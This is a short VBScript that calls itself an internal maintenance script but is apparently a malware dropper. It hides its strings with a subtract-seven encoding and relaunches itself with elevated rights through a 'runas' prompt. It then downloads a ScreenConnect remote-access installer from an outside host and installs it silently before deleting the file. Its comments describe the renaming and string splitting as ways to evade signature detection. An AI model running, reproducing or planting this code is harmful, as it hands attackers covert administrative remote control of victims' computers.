' Internal Maintenance Script - v2.1.0
On Error Resume Next
Randomize

' Obfuscated decoder: Accepts an array of integers, subtracts 7, returns string
Function _sysCalc(arr)
    Dim s, v: s = ""
    For Each v In arr
        s = s & Chr(v - 7)
    Next
    _sysCalc = s
End Function

' Deceptive Variable Names
' a = "elevate" (101, 108...)
' b = "Shell.Application"
' c = "runas"
a = Array(108, 115, 108, 125, 104, 123, 108)
b = Array(90, 111, 108, 115, 115, 53, 72, 119, 119, 115, 112, 106, 104, 123, 112, 118, 117)
c = Array(121, 124, 117, 104, 122)

Sub _vInit
    If Not WScript.Arguments.Named.Exists(_sysCalc(a)) Then
        ' Re-launching with offset-decoded strings
        CreateObject(_sysCalc(b)).ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /" & _sysCalc(a), "", _sysCalc(c), 0
        WScript.Quit
    End If
End Sub

_vInit

' COM Objects masked as simple generic objects
' o1 = Scripting.FileSystemObject
' o2 = WScript.Shell
Set o1 = CreateObject(_sysCalc(Array(90, 106, 121, 112, 119, 123, 112, 117, 110, 53, 77, 112, 115, 108, 90, 128, 122, 123, 108, 116, 86, 105, 113, 108, 106, 123)))
Set o2 = CreateObject(_sysCalc(Array(94, 90, 106, 121, 112, 119, 123, 53, 90, 111, 108, 115, 115)))

' Paths and URLs split into parts to break static signatures
u1 = "https://r-is.co.uk"
u2 = "ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
f1 = "C:\Windows\Temp\f_" & Int(Rnd * 1000) & ".msi"

' Reconstructing PowerShell command at runtime
' p1 = "powershell -Command "
p1 = _sysCalc(Array(119, 118, 126, 108, 121, 122, 111, 108, 115, 115, 39, 52, 74, 118, 120, 120, 104, 117, 107, 39))

' Execution logic
o2.Run p1 & "Try{(New-Object Net.WebClient).DownloadFile('" & u1 & u2 & "','" & f1 & "')}Catch{}", 0, True

If o1.FileExists(f1) Then
    ' m1 = "msiexec /i "
    ' m2 = " /qn /norestart"
    m1 = _sysCalc(Array(116, 122, 112, 108, 127, 108, 106, 39, 54, 112, 39))
    m2 = _sysCalc(Array(39, 54, 120, 117, 39, 54, 117, 118, 121, 108, 122, 123, 104, 121, 123))
    
    o2.Run m1 & Chr(34) & f1 & Chr(34) & m2, 0, True
    o1.DeleteFile f1
End If

WScript.Quit
